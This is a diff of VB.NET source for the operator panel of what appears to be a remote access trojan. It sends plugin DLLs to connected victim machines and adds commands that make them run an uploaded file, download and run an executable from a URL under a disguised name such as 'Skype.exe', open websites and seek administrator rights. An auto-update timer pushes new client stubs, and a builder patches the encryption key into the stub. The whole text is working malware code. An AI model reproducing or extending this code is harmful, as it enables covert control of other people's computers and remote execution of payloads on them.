-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PRI|'P'|"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
+            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                Dim MS As New IO.MemoryStream
+                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+                Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True))
+                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
+                MS.Write(CMD, 0, CMD.Length)
                 For Each x As ListViewItem In L1.SelectedItems
                     If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
+                        S.SendData(x.Tag, MS.ToArray)
                         x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
                     End If
                 Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
+                MS.Dispose()
             End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
+        Try
+            Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
+            Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
+
+            If String.IsNullOrEmpty(URL) Then
+                Exit Sub
+            Else
+                For Each x As ListViewItem In L1.SelectedItems
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL.ToString + "|'P'|" + EXE.ToString)
+                        x.BackColor = Color.DarkSlateGray
+                    End If
+                Next
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub VisitWebsiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitWebsiteToolStripMenuItem.Click
+        Try
+            Dim URL As String = InputBox("Enter URL", "Visit URL", "http://google.com")
+
+            If String.IsNullOrEmpty(URL) Then
+                Exit Sub
+            Else
+                If Not URL.StartsWith("http") Then
+                    URL = "http://" + URL
+                End If
+                For Each x As ListViewItem In L1.SelectedItems
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "Visit|'P'|" + URL)
+                        x.BackColor = Color.DarkSlateGray
+                    End If
+                Next
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub RunAsAdministratorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsAdministratorToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PRI|'P'|")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
@@ -1399,8 +1936,9 @@ Public Class Main
                 x.Remove()
             End If
         Next
-
-        IO.File.Delete("Misc/USERS.xml")
+        Dim myWriter As New IO.StreamWriter("MISC/USERS.dat")
+        myWriter.WriteLine("")
+        myWriter.Close()
     End Sub
 
 
@@ -1413,56 +1951,23 @@ Public Class Main
     End Sub
 
     Public ClientEXE As String
-    Private Async Sub Timer3_Tick(sender As Object, e As EventArgs) Handles AutoUpdate.Tick
-        Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(ClientEXE) + "|'P'|" + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(ClientEXE), True))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.Items
-                    If x.SubItems(VER.Index).Text <> S_Settings.StubVer AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                        S_Messages.Messages(x.SubItems(IP.Index).Text, "Updated to [" + S_Settings.StubVer + "] using Auto-Update")
-                    End If
-                Next
-
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
+    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles AutoUpdate.Tick
+        For Each x As ListViewItem In L1.Items
+            If x.SubItems(VER.Index).Text <> S_Settings.StubVer AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(ClientEXE) + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(ClientEXE), True)))
+                Messages(x.SubItems(IP.Index).Text, "Updated to [" + S_Settings.StubVer + "] using Auto-Update")
             End If
-        Catch ex As Exception
-        End Try
+        Next
     End Sub
 
     'Ping all clients
-    Private Async Sub Timer2_Tick(sender As Object, e As EventArgs) Handles PingClients.Tick
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles PingClients.Tick
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("!PSend"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.Items
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.Items
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "!PSend")
+                End If
+            Next
         Catch : End Try
     End Sub
 
@@ -1594,7 +2099,7 @@ Public Class Main
                                                     current.Operand = S_Settings.SPL
                                                 End If
                                                 If (str = "%KEY%") Then
-                                                    current.Operand = S_Settings.EOF
+                                                    current.Operand = S_Settings.ENDOF
                                                 End If
                                                 If (str = "%PASS%") Then
                                                     current.Operand = S_Settings.EncryptionKey
